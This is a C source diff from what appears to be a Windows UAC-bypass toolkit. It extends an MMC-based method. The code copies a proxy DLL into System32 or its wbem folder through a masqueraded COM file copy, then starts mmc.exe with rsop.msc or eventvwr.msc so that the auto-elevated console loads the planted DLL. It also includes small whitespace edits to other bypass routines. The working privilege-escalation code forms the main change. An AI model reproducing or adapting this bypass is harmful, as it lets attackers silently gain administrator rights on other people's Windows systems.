@@ -265,12 +265,14 @@ BOOL ucmWinSATMethod(
 *
 */
 BOOL ucmMMCMethod(
+    UACBYPASSMETHOD Method,
     LPWSTR lpTargetDll,
     PVOID ProxyDll,
     DWORD ProxyDllSize
     )
 {
     BOOL bResult = FALSE, cond = FALSE;
+    LPWSTR lpMscFile = NULL;
     WCHAR szSource[MAX_PATH * 2];
     WCHAR szDest[MAX_PATH * 2];
 
@@ -287,11 +289,37 @@ BOOL ucmMMCMethod(
         //check if file exists (like on srv for example)
         RtlSecureZeroMemory(szDest, sizeof(szDest));
         _strcpy(szDest, g_ctx.szSystemDirectory);
+
+        switch (Method) {
+        case UacMethodMMC2:
+            _strcat(szDest, WBEM_DIR);
+            break;
+        default:
+            break;
+        }
+
         _strcat(szDest, lpTargetDll);
+
         if (PathFileExists(szDest)) {
             OutputDebugString(T_TARGETALREADYEXIST);
             break;
         }
+
+        //target dir
+        RtlSecureZeroMemory(szDest, sizeof(szDest));
+        _strcpy(szDest, g_ctx.szSystemDirectory);
+
+        switch (Method) {
+        
+        case UacMethodMMC2:
+            _strcat(szDest, WBEM_DIR);
+            lpMscFile = RSOP_MSC;
+            break;
+
+        default:
+            lpMscFile = EVENTVWR_MSC;
+            break;
+        }   
 
         //put target dll
         RtlSecureZeroMemory(szSource, sizeof(szSource));
@@ -303,20 +331,16 @@ BOOL ucmMMCMethod(
             break;
         }
 
-        //target dir
-        RtlSecureZeroMemory(szDest, sizeof(szDest));
-        _strcpy(szDest, g_ctx.szSystemDirectory);
-
-        //drop fubuki to system32
+        //drop proxy dll to target directory
         bResult = ucmMasqueradedCopyFileCOM(szSource, szDest);
         if (!bResult) {
             break;
         }
 
         //run mmc console
-        //because of mmc harcoded backdoor uac will autoelevate mmc with valid and trusted MS command
-        //event viewer will attempt to load not existing dll, so we will give him our little friend
-        bResult = supRunProcess(MMC_EXE, EVENTVWR_MSC);
+        //because of mmc harcoded backdoor uac will autoelevate mmc with valid and trusted MS command.
+       //yuubari identified multiple exploits in msc commands loading scheme.
+        bResult = supRunProcess(MMC_EXE, lpMscFile);
 
     } while (cond);
 
@@ -693,7 +717,7 @@ BOOL ucmAutoElevateManifestW7(
         _strcpy(szSource, g_ctx.szSystemDirectory);
         _strcpy(szDest, g_ctx.szTempDirectory);
 
-        
+
         lpApplication = TASKHOST_EXE;//doesn't really matter, Yuubari module lists multiple targets
         _strcat(szSource, lpApplication);
         _strcat(szDest, lpApplication);
@@ -738,7 +762,7 @@ BOOL ucmAutoElevateManifestW7(
 
         _strcat(szDest, L"\\");
         _strcat(szDest, lpApplication);
-        bResult = supRunProcess(szDest, NULL);       
+        bResult = supRunProcess(szDest, NULL);
 
     } while (bCond);
 
@@ -798,7 +822,7 @@ BOOL ucmAutoElevateManifest(
         if (!bResult) {
             break;
         }
-        
+
         bResult = ucmAutoElevateManifestDropDll(ProxyDll, ProxyDllSize);
         if (!bResult) {
             break;
@@ -853,7 +877,7 @@ BOOL ucmInetMgrFindCallback(
 
     WCHAR textbuf[MAX_PATH * 4];
     WCHAR szDest[MAX_PATH * 2];
- 
+
     if (lpDirectory == NULL)
         return FALSE;
 
@@ -1010,7 +1034,7 @@ BOOL ucmInetMgrMethod(
         RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
         _strcpy(szBuffer, USER_SHARED_DATA->NtSystemRoot);
         _strcat(szBuffer, L"\\winsxs\\");
-        
+
         _strcpy(szDirBuf, szBuffer);
         _strcat(szBuffer, L"*");
 
@@ -1035,8 +1059,8 @@ BOOL ucmInetMgrMethod(
                     }
                 }
 
-            } while (FindNextFile(hFindFile, &fdata));           
-            
+            } while (FindNextFile(hFindFile, &fdata));
+
             FindClose(hFindFile);
         }
 
